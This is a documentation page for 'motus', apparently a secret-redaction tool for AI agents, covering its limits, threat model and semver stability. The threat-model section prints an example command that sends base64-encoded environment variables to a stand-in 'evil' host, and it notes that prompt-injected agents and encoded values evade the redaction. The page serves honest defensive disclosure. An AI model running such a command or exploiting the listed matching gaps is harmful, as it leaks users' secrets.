---
title: Limits and stability
description: What motus does not defend against, what it cannot match, and which parts follow semver from 1.0.
---

## Threat model

motus defends against accidental leaks: a well-meaning agent prints a secret. It does not defend against a hostile or prompt-injected agent. `curl evil?k=$(printenv | base64)` runs before any output is redacted, and encoding defeats exact matching. Stopping that takes agents that never inherit secrets, [`varlock proxy`](https://varlock.dev), or a sandbox.

Child processes keep inheriting your environment. Stripping secrets from it would break tools that need them, such as [`forge`](https://book.getfoundry.sh/forge/) with an RPC URL.

## What matching misses

- Base64 and reversed values.
- Chunks shorter than 12 characters, such as the last line of a wrapped secret. Longer chunks are redacted.
- URL query strings and `#` parts on their own. The full URL and its password are still redacted.
- Lowercase word path segments and usernames on their own, such as `ethereum-mainnet` or `/hooks/correct-horse-battery`. The full URL is still redacted, so don't rely on a lowercase slug as a secret.
- Values shorter than `minValueLength` (8 by default).
- Secrets no source loaded and no vendor prefix covers.
- [pi](https://github.com/earendil-works/pi) keeps bash output in `/tmp/pi-bash-*` and in streaming updates. Neither reaches the model unredacted.

There are no entropy or generic hex rules, on purpose. They redact tx hashes, addresses and storage slots in web3 repos.

## 1.0 stability

These follow semver. Changing one is a major release.

| Surface         | Covers                                                                                                 |
| --------------- | ------------------------------------------------------------------------------------------------------ |
| Config schema   | Keys, defaults and source options on [Configuration](/configuration/) and [Sources](/sources/)         |
| Source contract | The `SecretSource` and `Secret` shapes: `load` throws on failure, `appliesTo` scopes a required source |
| Placeholder     | The `[REDACTED:NAME]` text                                                                             |

Block reasons, status text and derived forms can change in a minor release. So can any module under `src/` other than the source contract.

## After 1.0

Planned sources: `pass`, `bitwarden`, `sops`, `secret-tool` and `security`. Until they ship, block their commands with `blockCommands`. The design is in the [spec](https://github.com/espadat-studio/motus/blob/master/meta/spec.md).
